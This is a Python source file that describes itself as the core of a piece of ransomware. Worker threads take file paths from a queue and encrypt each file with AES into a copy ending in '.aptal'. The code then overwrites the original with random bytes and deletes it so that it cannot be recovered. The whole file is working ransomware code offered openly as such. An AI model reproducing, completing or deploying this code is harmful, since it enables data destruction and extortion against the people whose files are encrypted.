import sys
import os
import random
from queue import Queue
from threading import Thread

from hasp.AESCipher import AESCipher

class APTAl(Thread):
    """
        Our ransomware's heart is here.
    """
    def __init__(self, idn, filelist, aeskey):
        Thread.__init__(self)
        self.id = idn
        self.file_list = filelist
        self.aes_key = aeskey
    
    def run(self):
        # unless thread pool is empty, empty thread take iv and file path for encryption
        while True:
            iv, innocent_file_path = self.file_list.get()
            try:
                self.infect(iv, innocent_file_path)
            finally:
                self.file_list.task_done()

    def purge_original_file(self,path,repeat=1):
        """
            To prevent files from being recovered, we write dummy data on the files here, then we delete it
            TODO: garbage collection 
        """
        file_size = os.path.getsize(path)
        chunk_size = 1*1024
        for _ in range(repeat):
            with open(path,"wb") as disarrange_file:
            # random.getrandbits(8) -> 2^8
                for _ in range((file_size//chunk_size)+1):
                    dummy_data = bytearray(random.getrandbits(8) for _ in range(chunk_size))
                    disarrange_file.write(dummy_data)
                disarrange_file.seek(0,0)
        os.remove(path)
            

    def infect(self, iv, path):
        """
            File encryption process is done here.
        """
        aes_cipher = AESCipher(self.aes_key)
        encrypted_file_path = path+".aptal"
        # why we read files chunk by chunk?
        # because, when we try to open huge size file, it can crash the computer and we may fail to achieve our goals
        # so we are reading files 16megabytes by 16megabytes
        chunk_size = 16*1024
        with open(path, 'rb') as infile:
            with open(encrypted_file_path, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    outfile.write(aes_cipher.encrypt(iv, chunk))
        self.purge_original_file(path)
        